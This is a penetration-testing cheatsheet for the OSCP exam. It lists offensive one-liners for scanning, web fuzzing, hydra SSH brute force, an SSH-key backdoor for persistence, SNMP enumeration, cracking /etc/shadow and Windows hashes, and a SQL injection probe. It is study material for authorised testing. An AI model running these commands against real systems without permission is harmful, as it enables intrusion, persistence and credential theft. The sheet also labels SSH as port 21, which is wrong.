# OSCP Cheatsheet

* [Enumeration](#Enumeration)
* [Fuzzing](#Fuzzing)
* [SSH - 22](#ssh---21)
  * [Brute force](#brute-force)
  * [SSH backdoor - post exploitation](#ssh-backdoor---post-exploitation)
* [SNMP - 161](#snmp---161)
* [RDP - 3389](#rdp---3389)
* [Password crack](#password-crack)
  * [John](#john)
  * [Hashcat](#hashcat)
* [SQL Injection](#SQL-Injection)
  * [Error based SQL Injection](#error-based-sql-injection)

# Enumeration

## Nmap Initial scan

~~~ bash
nmap -sCV -Pn $target --open --min-rate 3000 -oA output
~~~


# Fuzzing

## FFUF path fuzzing

~~~ bash
ffuf -w /usr/share/wordlists/wfuzz/general/common.txt -u http://target.com/FUZZ -mc 200
~~~

## FUFF subdomain fuzzing

~~~ bash
ffuf -u http://target.com/ -w ./fuzzDicts/subdomainDicts/main.txt -H "Host:FUZZ.target.com" -mc 200
~~~

# SSH - 21

## Brute force

~~~ bash
hydra -V -f -L users.txt -P passwords.txt ssh://target.com -u -vV
~~~

## SSH backdoor - post exploitation

~~~ bash
# Attacker
ssh-keygen -f <FILENAME>
chmod 600 <FILENAME>
cat <FILENAME>.pub -> copy

# Victim
echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys

# Connect
ssh -i <FILENAME> <USER>@<IP>
~~~


# SNMP - 161

## snmpbulkwalk

~~~ bash
snmpbulkwalk -c public -v2c $target
~~~


# RDP - 3389

## Connection

~~~ bash
xfreerdp /u:Administrator /p:'Password123!' /v:<IP> /dynamic-resolution
~~~

# Password crack

## John

### cracking htpasswd using mask

~~~ bash
john htpasswd -1=[0-9a-z] --mask='G4HeulB?1' --max-length=11
~~~

### cracking /etc/shadow

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
~~~

## Hashcat

### MD5 cracking

~~~ bash
hashcat -m 0 "412dd4759978acfcc81deab01b382403" /usr/share/wordlists/rockyou.txt.gz --show
hashcat -m 0 hashfile.txt /usr/share/wordlists/rockyou.txt.gz --show
~~~

### Linux password

~~~ bash
hashcat -m 1800 -a 0 hash.txt rockyou.txt
~~~


### Windows password

~~~ bash
hashcat -m 1000 -a 0 hash.txt rockyou.txt
~~~


# SQL Injection

## Error Based SQL Injection

~~~ sql
-- MSSQL
if (@@VERSION)=9 select 1 else select 2;
~~~
